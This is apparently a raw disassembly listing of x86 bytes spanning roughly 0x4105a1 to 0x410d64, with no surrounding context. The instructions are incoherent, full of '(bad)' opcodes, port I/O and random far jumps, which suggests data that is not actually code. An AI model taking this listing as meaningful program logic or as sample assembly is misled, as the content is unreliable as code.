  4105a1:	sbb    al,0x5d
  4105a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105a4:	jb     0x410571
  4105a6:	jmp    0x9df2fcc9
  4105ab:	out    dx,al
  4105ac:	adc    eax,0x171b5855
  4105b1:	jae    0x41054c
  4105b3:	outs   dx,DWORD PTR ds:[esi]
  4105b4:	imul   BYTE PTR [eax]
  4105b6:	ret    0x9928
  4105b9:	call   0x470e61bd
  4105be:	jne    0x4105d3
  4105c0:	popa   
  4105c1:	ficomp WORD PTR [esi+0x4]
  4105c4:	scas   eax,DWORD PTR es:[edi]
  4105c5:	dec    edi
  4105c6:	mov    eax,0xf51c2df0
  4105cb:	shr    BYTE PTR [ebp+0x35028da8],1
  4105d1:	inc    BYTE PTR [edx-0x39]
  4105d4:	test   al,0x44
  4105d6:	mov    esp,eax
  4105d8:	repnz sbb cl,0x65
  4105dc:	xor    al,0xea
  4105de:	pop    eax
  4105df:	ins    BYTE PTR es:[edi],dx
  4105e0:	test   DWORD PTR [edi],ebp
  4105e2:	push   edx
  4105e3:	push   edi
  4105e4:	jbe    0x4105f5
  4105e6:	inc    ebx
  4105e7:	xchg   ebx,eax
  4105e8:	mov    cl,0x6f
  4105ea:	sbb    eax,0xb21879c7
  4105ef:	mov    ds:0x79eeb849,al
  4105f4:	scas   eax,DWORD PTR es:[edi]
  4105f5:	and    esi,eax
  4105f7:	ins    BYTE PTR es:[edi],dx
  4105f8:	jmp    ebp
  4105fa:	xchg   ecx,eax
  4105fb:	xchg   ebp,eax
  4105fc:	in     al,0xa4
  4105fe:	cmp    eax,0xa671460d
  410603:	fnsave [eax-0x7f]
  410606:	call   0x2f045888
  41060b:	icebp  
  41060c:	jae    0x410656
  41060e:	das    
  41060f:	into   
  410610:	mov    eax,0x1fc4650f
  410615:	shl    DWORD PTR [eax],cl
  410617:	retf   0x6753
  41061a:	clc    
  41061b:	js     0x41060b
  41061d:	adc    al,0x72
  41061f:	rcl    BYTE PTR [bp-0xc],cl
  410623:	pop    ebp
  410624:	call   DWORD PTR [ebx+ebp*1+0x56affb81]
  41062b:	pop    edx
  41062c:	pop    ds
  41062d:	mov    eax,ds:0x103d6003
  410632:	out    0xd3,al
  410634:	cmp    DWORD PTR [esi+0x42],esi
  410637:	push   esp
  410638:	ins    DWORD PTR es:[edi],dx
  410639:	std    
  41063a:	jge    0x410603
  41063c:	inc    ecx
  41063d:	into   
  41063e:	mov    edx,0x7b1eb25b
  410643:	mov    bh,0xfa
  410645:	rcl    bl,cl
  410647:	mov    edi,0x5e758793
  41064c:	xchg   ebx,eax
  41064d:	fisttp DWORD PTR [edx+ebx*1-0x69]
  410651:	aad    0x50
  410653:	pushf  
  410654:	xchg   esi,eax
  410655:	int    0x79
  410657:	inc    eax
  410658:	add    ch,dl
  41065a:	jae    0x4106d5
  41065c:	jmp    0xef47e8ef
  410661:	fidiv  WORD PTR [ecx+0x497b790a]
  410667:	push   ds
  410668:	retf   0x7183
  41066b:	jbe    0x410609
  41066d:	sbb    ebx,DWORD PTR [edx+0x70895c30]
  410673:	adc    eax,0x743fb156
  410678:	dec    ebp
  410679:	into   
  41067a:	adc    eax,0xc8a6fb13
  41067f:	fs test eax,0x48afe49b
  410685:	fcmove st,st(1)
  410687:	scas   al,BYTE PTR es:[edi]
  410688:	push   edx
  410689:	stos   DWORD PTR es:[edi],eax
  41068a:	add    BYTE PTR ds:0xe7045c8c,dh
  410690:	push   ds
  410691:	inc    edx
  410692:	push   ss
  410693:	outs   dx,DWORD PTR ds:[esi]
  410694:	xor    esi,DWORD PTR [eax+0xb]
  410697:	and    al,0xc9
  410699:	inc    esi
  41069a:	inc    ebx
  41069b:	std    
  41069c:	mov    ds:0x5d0c9cea,al
  4106a1:	dec    ebx
  4106a2:	jmp    0xc2fd:0xed6c0b8a
  4106a9:	cmp    eax,0xd70eb59c
  4106ae:	inc    BYTE PTR [eax-0x17]
  4106b1:	cmp    dl,BYTE PTR [ebp+0x7d]
  4106b4:	mov    BYTE PTR ds:0xb42bf074,dl
  4106ba:	or     eax,0x9968d834
  4106bf:	lahf   
  4106c0:	push   esp
  4106c1:	sub    ah,BYTE PTR [edi+0x77a92afa]
  4106c7:	repnz pop esp
  4106c9:	(bad)  
  4106ca:	call   0x1976d3cc
  4106cf:	cmp    esi,DWORD PTR [ebx+0xc]
  4106d2:	enter  0x9721,0xe9
  4106d6:	jb     0x410669
  4106d8:	and    al,0x9c
  4106da:	mov    bl,0x9d
  4106dc:	bnd jo 0x410682
  4106df:	jl     0x41071c
  4106e1:	push   ds
  4106e2:	test   dl,al
  4106e4:	sbb    al,0x9a
  4106e6:	push   ebx
  4106e7:	ins    BYTE PTR es:[edi],dx
  4106e8:	sbb    eax,0xb0d3663b
  4106ed:	xchg   ecx,eax
  4106ee:	int3   
  4106ef:	orps   xmm2,XMMWORD PTR [esi+ecx*8+0x7e]
  4106f4:	cwde   
  4106f5:	add    bl,al
  4106f7:	imul   esi,DWORD PTR ds:0x2e394262,0x3110c65d
  410701:	retf   0x1cb1
  410704:	imul   esp,DWORD PTR [ebx-0x1d],0xffffff8e
  410708:	push   ebp
  410709:	(bad)  
  41070a:	mov    esi,0x6298737d
  41070f:	dec    esi
  410710:	xchg   DWORD PTR [edx+0x5a06c256],ebp
  410716:	dec    DWORD PTR [edi-0x6e8dcb91]
  41071c:	hlt    
  41071d:	in     eax,dx
  41071e:	sbb    eax,0x31bb92e2
  410723:	test   edi,ecx
  410725:	pop    ds
  410726:	xchg   ebp,eax
  410727:	or     eax,0xd7c14025
  41072c:	pop    esi
  41072d:	inc    ecx
  41072e:	shl    BYTE PTR [ebp-0x68],0x1c
  410732:	nop
  410733:	inc    ecx
  410734:	pop    ds
  410735:	mov    dl,BYTE PTR [ebx+0x3a644758]
  41073b:	or     eax,0x1a003708
  410740:	mov    cl,0x1b
  410742:	inc    esp
  410743:	stos   DWORD PTR es:[edi],eax
  410744:	ins    BYTE PTR es:[edi],dx
  410745:	popa   
  410746:	xchg   ebp,eax
  410747:	sbb    al,0x24
  410749:	in     al,0xe6
  41074b:	imul   edx,eax,0x3e3a9eb5
  410751:	das    
  410752:	inc    esp
  410753:	enter  0x2af2,0x7a
  410757:	dec    ebp
  410758:	ret    0x4aa6
  41075b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41075c:	pop    esi
  41075d:	rol    BYTE PTR [eax],cl
  41075f:	stos   DWORD PTR es:[edi],eax
  410760:	je     0x4107a2
  410762:	pushf  
  410763:	fadd   DWORD PTR [edx+0x4b50d028]
  410769:	jnp    0x410754
  41076b:	rol    DWORD PTR [eax],cl
  41076d:	jecxz  0x4107ac
  41076f:	cmc    
  410770:	mov    BYTE PTR [edx-0x6f],0xab
  410774:	lds    esp,FWORD PTR [ecx+0x4b3fd4b3]
  41077a:	or     BYTE PTR [eax+edx*4+0x319fe09e],0xd1
  410782:	mov    ebp,0x42a79145
  410787:	add    al,0x6
  410789:	mov    ebp,DWORD PTR [edx+0x1b]
  41078c:	jo     0x4107ae
  41078e:	push   0xed22f98d
  410793:	pop    eax
  410794:	ret    0x3c2a
  410797:	in     al,dx
  410798:	push   edi
  410799:	pusha  
  41079a:	mov    cs,edi
  41079c:	sti    
  41079d:	add    edi,DWORD PTR [eax-0x3b]
  4107a0:	lock add BYTE PTR ds:0x5c5e89ce,bh
  4107a7:	dec    edi
  4107a8:	inc    edi
  4107a9:	sbb    ecx,DWORD PTR [edx-0x6b49f0e]
  4107af:	dec    edi
  4107b0:	jmp    0x3c2a:0xe648fc07
  4107b7:	add    dh,BYTE PTR [ebx]
  4107b9:	sub    al,0x4e
  4107bb:	fcom   QWORD PTR [esi+0x7f]
  4107be:	inc    eax
  4107bf:	(bad)  
  4107c0:	scas   eax,DWORD PTR es:[edi]
  4107c1:	pusha  
  4107c2:	fwait
  4107c3:	xlat   BYTE PTR ds:[ebx]
  4107c4:	and    eax,0xe85054fb
  4107c9:	out    0x5c,al
  4107cb:	icebp  
  4107cc:	ins    BYTE PTR es:[edi],dx
  4107cd:	icebp  
  4107ce:	leave  
  4107cf:	xchg   ecx,eax
  4107d0:	xor    ebx,DWORD PTR [esp+eax*1-0x4ff3aa00]
  4107d7:	push   eax
  4107d8:	fild   WORD PTR [eax]
  4107da:	and    eax,0xf6325d1d
  4107df:	mov    edx,0x98dc702e
  4107e4:	retf   
  4107e5:	xor    DWORD PTR [esi-0x3a],edx
  4107e8:	mov    edx,0x3fc5321d
  4107ed:	mov    DWORD PTR [ebx],ebx
  4107ef:	imul   edi,DWORD PTR [esp+edx*4],0x45
  4107f3:	mov    ecx,0xec611edc
  4107f8:	enter  0x3690,0x64
  4107fc:	inc    ecx
  4107fd:	dec    edi
  4107fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ff:	popf   
  410800:	mov    ebx,0xe62ecc6f
  410805:	fnstcw WORD PTR [ebx-0x2c]
  410808:	and    al,0x1b
  41080a:	jl     0x4107d8
  41080c:	fimul  WORD PTR [edx]
  41080e:	adc    esp,esp
  410810:	cmp    al,0x34
  410812:	jecxz  0x410796
  410814:	pop    ss
  410815:	(bad)  
  410816:	aas    
  410817:	(bad)  
  410818:	es call 0x18c05788
  41081e:	pop    ebp
  41081f:	push   ds
  410820:	cmp    eax,DWORD PTR [esi-0xc15dcb8]
  410826:	pop    ebx
  410827:	push   es
  410828:	mov    cl,0x78
  41082a:	xchg   esp,eax
  41082b:	mov    cl,cl
  41082d:	push   ss
  41082e:	mov    DWORD PTR [ebx-0x30],edx
  410831:	outs   dx,DWORD PTR ds:[esi]
  410832:	pop    DWORD PTR [edx+esi*1]
  410835:	jecxz  0x4107ff
  410837:	push   cs
  410838:	cs ins BYTE PTR es:[edi],dx
  41083a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41083b:	(bad)  
  41083c:	addr16 add al,0x65
  41083f:	sbb    esi,DWORD PTR [edi]
  410841:	jge    0x4107d5
  410843:	xchg   BYTE PTR [ebp-0x6a],bl
  410846:	imul   esp,DWORD PTR [esi+ebx*4-0x79],0xffffffea
  41084b:	pop    esi
  41084c:	scas   eax,DWORD PTR es:[edi]
  41084d:	sub    eax,0x6dd13f62
  410852:	sbb    eax,0xe477ae3c
  410857:	das    
  410858:	or     al,0x59
  41085a:	push   cs
  41085b:	(bad)  
  41085c:	push   0x71
  41085e:	fdivrp st(7),st
  410860:	imul   esi,DWORD PTR [edx],0x3097bdb7
  410866:	jns    0x410812
  410868:	jmp    0xc032:0x75659364
  41086f:	scas   al,BYTE PTR es:[edi]
  410870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410871:	shl    DWORD PTR [ecx],cl
  410873:	aaa    
  410874:	sub    eax,0xb17e3c42
  41087a:	lahf   
  41087b:	add    BYTE PTR [esi+0x454a74ee],0x87
  410882:	xchg   esi,eax
  410883:	and    DWORD PTR [eax],ebp
  410885:	xor    ebp,0xd1f542d9
  41088b:	cmp    eax,0x754a7af6
  410890:	(bad)  
  410891:	pop    ebp
  410892:	les    esp,FWORD PTR [esi+0x2]
  410895:	in     eax,dx
  410896:	mov    eax,ds:0xf213e0c2
  41089b:	cmp    BYTE PTR [ebp+0x28],dh
  41089e:	sub    DWORD PTR [ecx],eax
  4108a0:	dec    ecx
  4108a1:	scas   al,BYTE PTR es:[edi]
  4108a2:	pop    es
  4108a3:	aam    0xdd
  4108a5:	ja     0x4108cf
  4108a7:	frstor [esi+0x2f]
  4108aa:	cmp    DWORD PTR [ebx],eax
  4108ac:	(bad)  
  4108ad:	out    dx,al
  4108ae:	push   0xbf6b4fdd
  4108b3:	fst    QWORD PTR [ebx]
  4108b5:	mov    ds:0x7a9f2f5a,eax
  4108ba:	gs pop ebx
  4108bc:	pushf  
  4108bd:	stc    
  4108be:	aam    0x88
  4108c0:	stc    
  4108c1:	test   DWORD PTR [esi-0x7ae0b5a9],esp
  4108c7:	icebp  
  4108c8:	retf   
  4108c9:	gs cwde 
  4108cb:	out    dx,al
  4108cc:	sbb    bl,BYTE PTR [eax-0x74]
  4108cf:	fild   WORD PTR [ebx-0x4785c79c]
  4108d5:	dec    edi
  4108d6:	stos   BYTE PTR es:[edi],al
  4108d7:	ins    DWORD PTR es:[edi],dx
  4108d8:	mov    esp,0xf66897cb
  4108dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108de:	call   0x29d7914c
  4108e3:	in     al,0xef
  4108e5:	push   0xdcda7d5
  4108ea:	add    DWORD PTR [eax-0x2a],edx
  4108ed:	outs   dx,BYTE PTR ds:[esi]
  4108ee:	scas   al,BYTE PTR es:[edi]
  4108ef:	mov    esp,0x53ca4f88
  4108f4:	mov    ah,0xc6
  4108f6:	mov    WORD PTR [ecx+ebx*8-0x37],?
  4108fa:	jmp    0x5bce:0x84c0c0be
  410901:	rol    cl,1
  410903:	pop    eax
  410904:	cmp    al,0x2b
  410906:	ja     0x410909
  410908:	xchg   ecx,eax
  410909:	jae    0x4108bb
  41090b:	inc    ecx
  41090c:	imul   BYTE PTR [edi+0x33]
  41090f:	sub    bh,bl
  410911:	pop    esi
  410912:	pop    ecx
  410913:	sub    esi,DWORD PTR [ecx]
  410915:	mov    BYTE PTR [edx+eax*8-0x5b310a61],ch
  41091c:	ret    0xbd22
  41091f:	jle    0x41090a
  410921:	arpl   WORD PTR ds:[eax],cx
  410924:	sar    BYTE PTR [ecx],cl
  410926:	push   ebp
  410927:	jecxz  0x410976
  410929:	adc    ah,BYTE PTR [eax-0x32]
  41092c:	mov    edi,0xe6c9a495
  410931:	mov    esp,0xdd3660f0
  410936:	jo     0xc016bbfc
  41093c:	ret    
  41093d:	bound  esp,QWORD PTR [eax+0x367d4a8a]
  410943:	call   0x4269:0xe6850f75
  41094a:	test   eax,0xa85f47e
  41094f:	fadd   st,st(5)
  410951:	test   BYTE PTR [eax],0xe
  410954:	es int3 
  410956:	pop    ss
  410957:	cwde   
  410958:	jmp    0x99e64028
  41095d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41095e:	sbb    DWORD PTR [edi+0x5d],eax
  410961:	sbb    edx,DWORD PTR [eax-0x7faca4fd]
  410967:	int    0x90
  410969:	into   
  41096a:	add    eax,0xe48f1455
  41096f:	jle    0x4109d1
  410971:	retf   0xa00e
  410974:	push   ss
  410975:	and    ah,BYTE PTR [ebp+ebp*2+0x2cf42c22]
  41097c:	inc    ecx
  41097d:	jmp    0xf806d230
  410982:	clc    
  410983:	pop    edx
  410984:	jp     0x4109cc
  410986:	pop    ecx
  410987:	push   ecx
  410988:	push   ecx
  410989:	sti    
  41098a:	xor    al,ch
  41098c:	enter  0x9f1f,0x1
  410990:	inc    esp
  410991:	pop    eax
  410992:	mov    ebx,0x1e5657d2
  410997:	ror    BYTE PTR [edx+eiz*4],1
  41099a:	or     esi,DWORD PTR [esi]
  41099c:	std    
  41099d:	mov    cl,0x2a
  41099f:	add    DWORD PTR [ecx],edx
  4109a1:	rcl    BYTE PTR [edi+0x43],1
  4109a4:	sti    
  4109a5:	sbb    DWORD PTR cs:[edx+eax*2-0x4b],ebx
  4109aa:	pop    esi
  4109ab:	lahf   
  4109ac:	sub    ah,ah
  4109ae:	cld    
  4109af:	retf   0xedf
  4109b2:	jnp    0x41095d
  4109b4:	retf   0x23b4
  4109b7:	mov    ch,0x92
  4109b9:	arpl   WORD PTR [ebx+edx*4-0x1070366a],dx
  4109c0:	daa    
  4109c1:	ins    BYTE PTR es:[edi],dx
  4109c2:	fwait
  4109c3:	xchg   edi,eax
  4109c4:	jmp    0x4109a6
  4109c6:	pushf  
  4109c7:	test   al,0xf4
  4109c9:	xchg   ecx,eax
  4109ca:	jb     0x410a32
  4109cc:	sahf   
  4109cd:	nop
  4109ce:	je     0x410a1f
  4109d0:	adc    BYTE PTR [eax-0xa],bl
  4109d3:	adc    BYTE PTR [esi],dh
  4109d5:	sahf   
  4109d6:	mov    ecx,0xf690dfd7
  4109db:	repz mov WORD PTR [edi+ebx*2-0x2bb5d524],es
  4109e3:	mov    ch,0x1f
  4109e5:	pop    DWORD PTR [ebx+0x31f68ba0]
  4109eb:	xlat   BYTE PTR ds:[ebx]
  4109ec:	and    eax,DWORD PTR [eax]
  4109ee:	cmp    eax,0x17c633c6
  4109f3:	dec    edi
  4109f4:	or     edi,DWORD PTR [edi-0x75]
  4109f7:	retf   
  4109f8:	inc    ecx
  4109f9:	repnz sbb eax,0xc9f74706
  4109ff:	(bad)  
  410a00:	rol    BYTE PTR [ebp-0x4b],cl
  410a03:	xchg   DWORD PTR [ecx-0x68],esp
  410a06:	inc    esi
  410a07:	fcom   DWORD PTR [edi]
  410a09:	xor    bl,dl
  410a0b:	and    BYTE PTR [ebp-0x4f],bl
  410a0e:	outs   dx,BYTE PTR ds:[esi]
  410a0f:	cmc    
  410a10:	xor    DWORD PTR [ecx-0x2b],0x914a1255
  410a17:	mov    bl,0xbf
  410a19:	dec    ecx
  410a1a:	sub    BYTE PTR [esi+eax*8+0x43913b3f],bh
  410a21:	iret   
  410a22:	ins    BYTE PTR es:[edi],dx
  410a23:	sub    esi,esi
  410a25:	push   ds
  410a26:	mov    ds:0xacf8f370,al
  410a2b:	push   0xffffffb0
  410a2d:	jnp    0x410a02
  410a2f:	fdiv   DWORD PTR [eax+0x7d]
  410a32:	lahf   
  410a33:	(bad)  
  410a34:	mov    cl,0x7c
  410a36:	or     eax,DWORD PTR [ebp-0x4960446f]
  410a3c:	mov    eax,ds:0xea3abe
  410a41:	aas    
  410a42:	sbb    esi,DWORD PTR [ebx+0x38]
  410a45:	repz fwait
  410a47:	retf   0xb26f
  410a4a:	jp     0x410a51
  410a4c:	jne    0x410a13
  410a4e:	cdq    
  410a4f:	loope  0x410aa2
  410a51:	cdq    
  410a52:	and    eax,esi
  410a54:	ret    0x87e2
  410a57:	mov    ecx,0x8865548c
  410a5c:	sbb    BYTE PTR [ecx+0x5],al
  410a5f:	pop    esi
  410a60:	cmp    DWORD PTR [esi],edi
  410a62:	ja     0x410a2a
  410a64:	sahf   
  410a65:	mov    ?,ecx
  410a67:	push   cs
  410a68:	jns    0x410a3d
  410a6a:	stc    
  410a6b:	(bad)  
  410a6c:	adc    ebx,DWORD PTR [edi+ecx*8+0xa]
  410a70:	ror    DWORD PTR [ebx-0x450319bb],cl
  410a76:	jle    0x410ad0
  410a78:	call   0x12aa:0x59da092b
  410a7f:	adc    edi,DWORD PTR [ebx-0x732640e9]
  410a85:	adc    BYTE PTR [edi-0x1c],al
  410a88:	mov    dl,BYTE PTR [edx]
  410a8a:	test   al,0x5b
  410a8c:	pop    ebp
  410a8d:	fsubr  QWORD PTR [ecx]
  410a8f:	out    dx,eax
  410a90:	push   edi
  410a91:	fidivr WORD PTR [ecx]
  410a93:	xchg   BYTE PTR [ebp+0x12e529fd],bl
  410a99:	in     eax,dx
  410a9a:	jnp    0x410a6e
  410a9c:	jge    0x410a62
  410a9e:	mov    ds:0x418bd785,eax
  410aa3:	call   0xe252:0x38db9f50
  410aaa:	mov    ecx,0x189c69c0
  410aaf:	xchg   edi,eax
  410ab0:	loope  0x410abf
  410ab2:	into   
  410ab3:	jno    0x410a52
  410ab5:	mov    ch,0xa7
  410ab7:	cld    
  410ab8:	xchg   BYTE PTR [eax+0x77],bl
  410abb:	xor    esi,DWORD PTR [edi+0x4]
  410abe:	(bad)  
  410abf:	push   0xf
  410ac1:	or     DWORD PTR [edx],esp
  410ac3:	mov    eax,ds:0x2344cdfa
  410ac8:	fmul   DWORD PTR [esi-0x31]
  410acb:	adc    ch,ah
  410acd:	iret   
  410ace:	popf   
  410acf:	aas    
  410ad0:	lock (bad) 
  410ad2:	jg     0x410a8c
  410ad4:	ds loope 0x410a7a
  410ad7:	cmc    
  410ad8:	mov    ebp,0xb1048bb0
  410add:	iret   
  410ade:	repz inc eax
  410ae0:	sub    eax,0xf79fca6f
  410ae5:	pop    edx
  410ae6:	lods   eax,DWORD PTR ds:[esi]
  410ae7:	icebp  
  410ae8:	aam    0x8a
  410aea:	cmp    al,0xa3
  410aec:	xor    al,0x4f
  410aee:	or     dh,dh
  410af0:	aam    0x7f
  410af2:	out    0x6d,al
  410af4:	out    dx,al
  410af5:	and    al,BYTE PTR [ecx+0x60]
  410af8:	ret    0x4bfd
  410afb:	call   0xd288:0xc282e174
  410b02:	or     BYTE PTR [ebx],bh
  410b04:	push   edx
  410b05:	mov    ebx,0xc88521ee
  410b0a:	adc    ebp,DWORD PTR [eax-0x7f900dbc]
  410b10:	ja     0x410b85
  410b12:	mov    ss,WORD PTR [ebp+0x27]
  410b15:	ret    0x9ebd
  410b18:	adc    ebp,DWORD PTR [edx-0x21]
  410b1b:	or     esi,DWORD PTR [edi+eiz*1]
  410b1e:	xchg   ebp,eax
  410b1f:	mov    ds:0x77972aae,eax
  410b24:	or     bl,BYTE PTR [edi]
  410b26:	cli    
  410b27:	rcl    DWORD PTR [ebp-0x769733d6],1
  410b2d:	inc    edx
  410b2e:	cs ins DWORD PTR es:[edi],dx
  410b30:	add    bh,BYTE PTR [eax-0x34d9d0d5]
  410b36:	sub    DWORD PTR [ebp+ebp*8+0x31656696],ebx
  410b3d:	fcomi  st,st(7)
  410b3f:	and    esi,DWORD PTR [edi]
  410b41:	(bad)  
  410b42:	(bad)  
  410b43:	in     al,dx
  410b44:	lahf   
  410b45:	xor    DWORD PTR [edi],esi
  410b47:	mov    cl,0x5f
  410b49:	and    al,0x7b
  410b4b:	jb     0x410b7d
  410b4d:	retf   0x32ac
  410b50:	jne    0x410b67
  410b52:	pop    edi
  410b53:	into   
  410b54:	add    eax,0x16888048
  410b59:	call   0xe48d:0xea39f711
  410b60:	sbb    BYTE PTR [eax+0x5f],dl
  410b63:	jo     0x410b59
  410b65:	ds mov ah,0xdf
  410b68:	retf   
  410b69:	xchg   DWORD PTR ds:0x9964fe71,ebp
  410b6f:	mov    esi,DWORD PTR [ecx+0x16]
  410b72:	aam    0x37
  410b74:	in     eax,dx
  410b75:	test   eax,0x49fcf3b8
  410b7a:	into   
  410b7b:	mov    bh,0x14
  410b7d:	xchg   BYTE PTR [edi],ah
  410b7f:	icebp  
  410b80:	push   esi
  410b81:	dec    eax
  410b82:	jb     0x410be8
  410b84:	pop    esp
  410b85:	mov    ah,0x32
  410b87:	ret    
  410b88:	outs   dx,DWORD PTR ds:[esi]
  410b89:	mov    BYTE PTR [ecx],ah
  410b8b:	adc    eax,0x2175e8a1
  410b90:	and    ah,BYTE PTR ds:0x2fdd0db1
  410b96:	xchg   edi,eax
  410b98:	or     eax,0x7b
  410b9b:	(bad)  
  410b9c:	(bad)  
  410b9d:	scas   eax,DWORD PTR es:[edi]
  410b9e:	retf   
  410b9f:	xchg   edi,eax
  410ba0:	add    al,0x9
  410ba2:	arpl   WORD PTR [edx],cx
  410ba4:	pop    edi
  410ba5:	pop    ecx
  410ba6:	inc    esp
  410ba7:	push   ss
  410ba8:	lock psrlw mm1,QWORD PTR ds:[ebx]
  410bad:	cdq    
  410bae:	mov    edx,0x906ea2ef
  410bb3:	(bad)  
  410bb4:	sub    esi,DWORD PTR [edi+0x73]
  410bb7:	bswap  ebp
  410bb9:	cmp    BYTE PTR [ecx+0x5c],ch
  410bbc:	stc    
  410bbd:	pushf  
  410bbe:	pop    edx
  410bbf:	stos   DWORD PTR es:[edi],eax
  410bc0:	push   ss
  410bc1:	or     eax,0x96249e2
  410bc6:	daa    
  410bc7:	fisttp WORD PTR [ebx]
  410bc9:	and    BYTE PTR [ebp+0x69f8593a],al
  410bcf:	nop
  410bd0:	lods   eax,DWORD PTR ds:[esi]
  410bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bd2:	or     BYTE PTR [edx],0xae
  410bd5:	mov    esi,0x9eb9d452
  410bda:	push   eax
  410bdb:	mov    eax,0x7c0355a1
  410be0:	outs   dx,DWORD PTR ds:[esi]
  410be1:	push   0x33dd4c4e
  410be6:	pop    edi
  410be7:	mov    ecx,0xbe5e42b8
  410bec:	mov    ah,0xa0
  410bee:	(bad)  
  410bef:	sub    esi,DWORD PTR [edx+0x6]
  410bf2:	cmp    BYTE PTR [esi-0x6],dh
  410bf5:	mov    ds:0x75bbf825,al
  410bfa:	out    dx,eax
  410bfb:	xchg   ebx,eax
  410bfc:	sub    ebp,esi
  410bfe:	mov    dh,BYTE PTR [esi+0x14da54fe]
  410c04:	out    dx,al
  410c05:	aad    0x45
  410c07:	sbb    eax,0xb99b39bc
  410c0c:	cmp    ecx,DWORD PTR [ecx+0x398de2cc]
  410c12:	dec    ebp
  410c13:	fistp  DWORD PTR [eax-0x3d9ecb50]
  410c19:	aas    
  410c1a:	ins    DWORD PTR es:[edi],dx
  410c1b:	adc    eax,0x21b62f60
  410c20:	and    DWORD PTR [ebp-0x20],eax
  410c23:	jle    0x410c08
  410c25:	cdq    
  410c26:	das    
  410c27:	sti    
  410c28:	lea    esi,[edx]
  410c2a:	mul    DWORD PTR [esi+0x4]
  410c2d:	arpl   WORD PTR [ecx+ebp*4+0x69c884e8],ax
  410c34:	dec    ebp
  410c35:	cmp    BYTE PTR [esi],dl
  410c37:	dec    ecx
  410c38:	in     eax,dx
  410c39:	mov    cl,BYTE PTR [edi+0x37c3b57d]
  410c3f:	mov    ah,ch
  410c41:	and    al,0x79
  410c43:	jp     0x410c0f
  410c45:	mov    ah,cl
  410c47:	retf   
  410c48:	inc    ecx
  410c49:	jo     0x410bee
  410c4b:	sbb    dl,ah
  410c4d:	fldcw  WORD PTR [ebx+0x4d1cef6]
  410c53:	dec    ecx
  410c54:	pop    ss
  410c55:	ja     0x410c50
  410c57:	or     esp,eax
  410c59:	aam    0x79
  410c5b:	pop    esi
  410c5c:	mov    esi,0xdf35fc70
  410c61:	outs   dx,BYTE PTR ds:[esi]
  410c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c63:	aaa    
  410c64:	clc    
  410c65:	adc    dl,BYTE PTR [eax-0x2d6de789]
  410c6b:	out    dx,eax
  410c6c:	cli    
  410c6d:	adc    BYTE PTR [esi],ah
  410c6f:	xor    al,0x13
  410c71:	or     al,0x19
  410c73:	repnz pop edx
  410c75:	sub    BYTE PTR [edx+0x763dfd9a],0xfe
  410c7c:	jecxz  0x410cde
  410c7e:	sub    BYTE PTR [ebx+eax*4+0x6b],bl
  410c82:	cli    
  410c83:	cmp    BYTE PTR [eax],dh
  410c85:	xor    BYTE PTR [edi+0x502b1792],ah
  410c8b:	ficomp WORD PTR [ebx+0x26]
  410c8e:	aad    0x0
  410c90:	pop    ebx
  410c91:	xchg   ebx,eax
  410c92:	mov    bh,0x66
  410c94:	xor    BYTE PTR [ecx],ch
  410c96:	repnz xchg edi,eax
  410c98:	pop    edx
  410c99:	nop
  410c9a:	aad    0x6e
  410c9c:	mov    esp,0xc6879ca3
  410ca1:	jl     0x410c92
  410ca3:	stos   DWORD PTR es:[edi],eax
  410ca4:	loopne 0x410ccb
  410ca6:	fisttp QWORD PTR [esi+0x36c940fc]
  410cad:	adc    BYTE PTR [esi],ah
  410caf:	loope  0x410cce
  410cb1:	inc    esi
  410cb2:	lods   eax,DWORD PTR ds:[esi]
  410cb3:	pop    edi
  410cb4:	mov    esi,0x5c2c4dd1
  410cb9:	add    DWORD PTR [eax+0xaa03542],0x8691af11
  410cc3:	das    
  410cc4:	or     al,0xf0
  410cc6:	mov    edi,0x3f803031
  410ccb:	xchg   edi,eax
  410ccc:	inc    ebx
  410ccd:	fadd   st,st(3)
  410ccf:	popf   
  410cd0:	clc    
  410cd1:	ja     0x410d2e
  410cd3:	xchg   edx,eax
  410cd4:	inc    ecx
  410cd5:	and    eax,0x2a58040c
  410cda:	shl    DWORD PTR [eax+0x77],0x8
  410cde:	das    
  410cdf:	sbb    eax,0xf3766d26
  410ce4:	push   cs
  410ce5:	jno    0x410d56
  410ce7:	iret   
  410ce8:	test   eax,0x56997b6d
  410ced:	add    ch,ch
  410cef:	inc    edi
  410cf0:	pushf  
  410cf1:	ret    0x800a
  410cf4:	add    esi,DWORD PTR [ebx+edi*4-0x395448d]
  410cfb:	push   es
  410cfc:	shl    BYTE PTR [eax+esi*4-0x53],1
  410d00:	(bad)  
  410d01:	popf   
  410d02:	inc    eax
  410d03:	push   0xffffffbf
  410d05:	pop    ebx
  410d06:	pusha  
  410d07:	int3   
  410d08:	jns    0x410d51
  410d0a:	xor    ebp,ecx
  410d0c:	push   es
  410d0d:	scas   al,BYTE PTR es:[edi]
  410d0e:	cwde   
  410d0f:	shr    BYTE PTR [ecx+0x1e04a316],1
  410d15:	pop    edi
  410d16:	iret   
  410d17:	repnz push 0xffffffb0
  410d1a:	outs   dx,DWORD PTR ds:[esi]
  410d1b:	test   DWORD PTR [ecx-0x69],0xbee2cc47
  410d22:	jmp    DWORD PTR [ebx+0x20]
  410d25:	sub    eax,0xf0a57201
  410d2a:	mul    BYTE PTR [ecx+0x47]
  410d2d:	mov    ebp,0xe966a8b0
  410d32:	push   ecx
  410d33:	sbb    eax,0xba564e32
  410d38:	cdq    
  410d39:	daa    
  410d3a:	fcomp  QWORD PTR [ebx+0x42]
  410d3d:	mov    ecx,0xd2589b7c
  410d42:	push   0x40591867
  410d47:	fwait
  410d48:	clc    
  410d49:	adc    al,0x5b
  410d4b:	test   al,0xd3
  410d4d:	mov    bl,0x98
  410d4f:	sub    al,0x8b
  410d51:	or     al,0x26
  410d53:	jo     0x410d45
  410d55:	aam    0x37
  410d57:	inc    ecx
  410d58:	sub    al,BYTE PTR [esi-0x5a6105a2]
  410d5e:	inc    edi
  410d5f:	jecxz  0x410cf0
  410d61:	adc    eax,0xfffffffc
  410d64:	sbb    BYTE PTR [ebp+0x5],al
